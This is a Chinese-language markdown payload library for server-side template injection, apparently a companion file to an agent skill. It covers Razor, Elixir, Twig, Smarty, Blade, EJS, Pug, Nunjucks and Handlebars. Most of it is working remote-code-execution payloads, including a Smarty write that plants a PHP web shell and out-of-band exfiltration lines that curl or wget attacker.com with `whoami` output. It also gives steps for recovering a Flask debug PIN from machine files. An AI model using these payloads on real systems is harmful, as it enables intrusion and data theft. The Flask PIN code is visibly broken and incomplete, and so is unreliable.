# SSTI 扩展场景库 (SCENARIOS.md)

> 配套技能：`ssti-server-side-template-injection/SKILL.md`
> 本文件覆盖 §7–§11 的扩展内容：Razor / EEx-LEEx-HEEx / PHP 技术栈 / JavaScript 模板引擎 / 通用 polyglot 探测 / 数学指纹 / 盲 SSTI（布尔 / 时间 / OOB）/ Flask Debug PIN 前置条件。

---

## §7. Razor / .NET 模板注入

### 7.1 Razor 语法与注入点

Razor 是 ASP.NET Core 默认视图引擎，`@` 为指令前缀。

```text
@{ // C# 代码块
    var x = "test";
}
@Model.Name   // 模型字段输出
@Html.Raw(userInput)  // 原始输出（危险，不做 HTML 编码）
```

**注入触发**：当用户输入直接拼接到 `.cshtml` 模板或通过 `@Html.Raw()` 输出时。

### 7.2 Razor RCE Payload

```text
@{ var p = new System.Diagnostics.Process(); }
@{ p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c whoami"; p.StartInfo.RedirectStandardOutput = true; p.Start(); }
@p.StandardOutput.ReadToEnd()
```

精简版（单行）：

```text
@(System.Diagnostics.Process.Start("cmd","/c whoami"))
```

### 7.3 .NET 8/9 反射绕过

当 `System.Diagnostics.Process` 被沙箱限制时，用反射加载：

```text
@{
    var t = Type.GetType("System.Diagnostics.Process, System");
    var m = t.GetMethod("Start", new Type[]{typeof(string), typeof(string)});
    var result = m.Invoke(null, new object[]{"cmd", "/c whoami"});
}
@result
```

### 7.4 Blazor Server 端渲染注入

Blazor Server 模式下，`@inject` 可注入服务，若用户可控 `RenderFragment` 则可能触发组件注入：

```razor
<DynamicComponent Type="@userControlledType" Parameters="@params" />
```

---

## §8. EEx / LEEx / HEEx (Elixir / Phoenix)

### 8.1 EEx 语法

```elixir
<%= expr %>   # 输出表达式结果
<% code %>    # 执行代码不输出
```

### 8.2 Phoenix LEEx (Live EEx)

```elixir
<%= @user_input %>   # 默认 HTML 转义
<%= raw(@user_input) %>  # 原始输出（危险）
```

### 8.3 Elixir SSTI → RCE

```elixir
<%= System.cmd("whoami", []) %>
<%= File.read!("/etc/passwd") %>
<%= :os.cmd('whoami') %>
```

### 8.4 HEEx (HTML-aware EEx)

HEEx 在编译时进行 HTML 结构校验，传统 `<%= %>` 在属性值内仍可注入：

```html
<div class="<%= user_input %>">
```

如果 `user_input = `"><img src=x onerror=alert(1)>`，则产生 XSS（非 SSTI，但相关）。

---

## §9. PHP 技术栈模板注入

### 9.1 Twig (Symfony)

```text
{{7*7}}   → 49
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}  // Twig 1.x RCE
{{['id']|filter('system')}}  // Twig 2.x+ RCE
{{['id']|map('system')}}     // Twig 3.x RCE (需 map 可用)
```

### 9.2 Smarty (PHP)

```text
{php}echo `id`;{/php}   // Smarty 2.x (已弃用)
{system('id')}           // Smarty 3+ 沙箱绕过
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['c']); ?>",true)}  // 文件写入
```

### 9.3 Blade (Laravel)

```blade
@php
    system('id');
@endphp

{{ system('id') }}  // Blade 默认转义，但 system() 返回值会输出
{!! system('id') !!}  // 原始输出
```

### 9.4 Plates PHP

```php
<?= $this->e($user_input) ?>  // 转义
<?= $user_input ?>            // 不转义（危险）
```

---

## §10. JavaScript 模板引擎 SSTI

### 10.1 EJS (Node.js)

```text
<%= 7*7 %>        → 49
<%- require('child_process').execSync('id') %>  // RCE (未转义输出)
```

### 10.2 Pug (Jade)

```text
- var x = require('child_process').execSync('id').toString()
p= x
```

或利用 `#{}` 插值：

```text
#{global.process.mainModule.require('child_process').execSync('id')}
```

### 10.3 Nunjucks

```text
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

### 10.4 Handlebars

```text
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id')"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## §11. 通用 Polyglot 探测 + 数学指纹 + 盲 SSTI

### 11.1 通用 Polyglot 探测 Payload

覆盖 Jinja2 / Twig / FreeMarker / Velocity / Smarty / Mako / Handlebars / ERB / EJS：

```text
${{<%[%'"}}%\.
```

详细变体：

```text
{{7*7}}         → 49 (Jinja2/Twig/Nunjucks)
${7*7}          → 49 (FreeMarker/Velocity)
<%= 7*7 %>      → 49 (ERB/EJS)
#{7*7}          → 49 (Pug/Ruby)
{7*7}           → 49 (Smarty)
*{7*7}          → 49 (Thymeleaf)
@(7*7)          → 49 (Razor)
```

### 11.2 数学指纹区分引擎

| 输入 | Jinja2 | Twig | FreeMarker | Smarty |
|------|--------|------|-----------|--------|
| `{{7*7}}` | 49 | 49 | 49 | 49 |
| `{{7*'7'}}` | 7777777 | 49 | **Error** | 49 |
| `${7*7}` | `${49}` | `${49}` | 49 | `${49}` |
| `{{1/0}}` | **Error** | **Error** | **Infinity** | 0 |
| `{{'a'.upper()}}` | A | A | **Error** | A |
| `{{range(5)}}` | [0,1,2,3,4] | **Error** | **Error** | **Error** |

### 11.3 盲 SSTI — 布尔盲注

通过条件表达式判断模板引擎是否执行：

```text
{% if 7*7 == 49 %}MATCH{% endif %}        // Jinja2
{% if 7*7 == 49 %}{{'MATCH'}}{% endif %}   // Twig
<#if 7*7 == 49>MATCH</#if>                 // FreeMarker
```

### 11.4 盲 SSTI — 时间盲注

```text
{% if 7*7 == 49 %}{{sleep(5)}}{% endif %}              // Jinja2 (需 time 模块)
{% if 7*7 == 49 %}<#assign x="sleep">{{x(5)}}</#if>    // FreeMarker (变种)
{{7*7|sleep(5)}}                                        // Twig (过滤器链)
```

### 11.5 盲 SSTI — OOB 外带

**DNS 外带**：

```text
{{''.__class__.__mro__[1].__subclasses__()[X]('curl http://$(whoami).attacker.com/')}}  // Jinja2
<#assign cmd="curl http://$(whoami).attacker.com/">${cmd?exec}</#assign>                // FreeMarker
```

**HTTP 外带**：

```text
{{config.__class__.__init__.__globals__['os'].popen('wget http://attacker.com/$(whoami)').read()}}  // Flask/Jinja2
```

### 11.6 Flask Debug PIN 前置条件

当 Flask 处于 debug 模式且 `/console` 端点可访问时，需计算 PIN 才能执行 Python：

**PIN 计算要素**：

```python
# 1. username (运行 Flask 的用户)
# 2. modname (通常 "flask.app")
# 3. appname (通常 "Flask")
# 4. moddir (flask/app.py 的路径)
# 5. uuid.getnode() (MAC 地址 → 十进制)
# 6. get_machine_id() (机器 ID)

import hashlib
probably_public_bits = [
    username,    # /etc/passwd 或 whoami
    'flask.app', # modname
    'Flask',     # appname
    moddir,      # /usr/lib/python3.x/site-packages/flask/app.py
]
private_bits = [
    str(uuid.getnode()),  # MAC → decimal, from /sys/class/net/eth0/address
    machine_id,           # /etc/machine-id 或 /proc/sys/kernel/random/boot_id
]
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    h.update(bit.encode())
h.update(b'cookiesalt')
num = None
h = hashlib.md5()
h.update(format(num, 'x').encode())
return h.digest()[:9].decode()
```

**自动化 PIN 计算**：

```bash
# 读取 MAC 地址
cat /sys/class/net/eth0/address | sed 's/://g' | python -c "import sys; print(int(sys.stdin.read().strip(), 16))"
# 读取 machine-id
cat /etc/machine-id 2>/dev/null || cat /proc/sys/kernel/random/boot_id
# 读取用户名
whoami
# 读取 moddir
python -c "import flask.app; print(flask.app.__file__)"
```

---

## 附录：引擎快速识别决策树

```
输入 {{7*7}}
├── 返回 49
│   ├── 输入 {{7*'7'}} 返回 7777777 → Jinja2 / Mako
│   ├── 输入 {{7*'7'}} 返回 49 → Twig / Nunjucks
│   └── 输入 {{7*'7'}} 报错 → FreeMarker
├── 返回 {{7*7}} (原样)
│   ├── 输入 ${7*7} 返回 49 → FreeMarker / Velocity
│   ├── 输入 <%= 7*7 %> 返回 49 → ERB / EJS
│   └── 输入 @(7*7) 返回 49 → Razor
└── 无响应
    └── 尝试盲 SSTI (布尔/时间/OOB)
```
